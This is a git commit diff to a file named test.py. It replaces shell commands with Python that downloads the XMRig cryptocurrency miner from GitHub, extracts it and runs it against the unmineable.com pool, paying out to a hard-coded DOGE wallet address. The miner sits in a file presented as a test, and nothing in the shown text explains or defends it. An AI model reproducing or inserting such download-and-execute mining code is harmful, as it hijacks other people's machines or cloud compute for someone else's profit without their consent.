0f4f468a6a5823d492a895768db33e42ea1dabd2
SUPREME-CONDEMNER <164725996+SUPREME-CONDEMNER@users.noreply.github.com>
2024-04-30 11:02:50 +0500

    Update test.py

--- test.py
+++ test.py
@@ -1,7 +1,26 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+import requests
+import tarfile
+import os
 
-tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
+# Download the file
+url = "https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz"
+filename = url.split("/")[-1]
 
-cd xmrig-6.12.2
+print("Downloading", filename)
+response = requests.get(url)
+with open(filename, "wb") as f:
+    f.write(response.content)
 
-./xmrig -o rx.unmineable.com:3333 -a rx -k -t 2 -u DOGE:DFwWFuKENgq3pd3zrnzafTMXcWLLmERZ6x
+# Extract the tar.gz file
+print("Extracting", filename)
+with tarfile.open(filename, "r:gz") as tar:
+    tar.extractall()
+
+# Change directory
+dirname = filename.replace(".tar.gz", "")
+print("Changing directory to", dirname)
+os.chdir(dirname)
+
+# Execute xmrig
+print("Executing xmrig")
+os.system("./xmrig -o rx.unmineable.com:3333 -a rx -k -t 2 -u DOGE:DFwWFuKENgq3pd3zrnzafTMXcWLLmERZ6x")
